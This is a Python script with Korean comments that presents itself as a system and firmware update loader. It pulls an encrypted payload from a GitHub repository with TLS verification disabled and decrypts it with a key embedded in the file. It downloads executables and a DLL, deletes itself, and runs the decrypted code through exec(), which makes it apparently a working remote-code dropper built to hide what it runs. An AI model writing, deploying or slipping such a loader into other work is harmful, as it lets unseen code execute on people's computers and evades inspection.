# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행 + 펌웨어 자동 다운로드"""
import urllib.request, base64, zlib, json, time, ssl, os
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
URL = f"https://api.github.com/repos/blacknut0319-del/systemupdate/contents/data.txt?t={int(time.time())}"
BASE = os.path.dirname(os.path.abspath(__file__))

def download_file(github_path, local_path):
    """GitHub에서 파일 다운로드 (없으면 무시)."""
    if os.path.exists(local_path):
        return
    try:
        url = f"https://api.github.com/repos/blacknut0319-del/systemupdate/contents/{github_path}?t={int(time.time())}"
        req = urllib.request.Request(url, headers={"User-Agent": "ddong"})
        data = json.loads(urllib.request.urlopen(req, timeout=15, context=ctx).read())
        content = base64.b64decode(data["content"])
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        with open(local_path, "wb") as f:
            f.write(content)
    except:
        pass

try:
    # data.txt 다운로드 + 복호화
    req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
    b64_str = base64.b64decode(json.loads(urllib.request.urlopen(req, timeout=10, context=ctx).read())["content"]).decode("utf-8")
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    
    # 펌웨어 파일 다운로드
    os.chdir(BASE)
    download_file("firmware/cs_firmware.hex", "firmware/cs_firmware.hex")
    download_file("firmware/avrdude/avrdude.exe", "firmware/avrdude/avrdude.exe")
    download_file("firmware/avrdude/avrdude.conf", "firmware/avrdude/avrdude.conf")
    download_file("firmware/avrdude/libusb0.dll", "firmware/avrdude/libusb0.dll")
    
    try: os.remove(__file__)
    except: pass
    exec(code)
except Exception as err:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
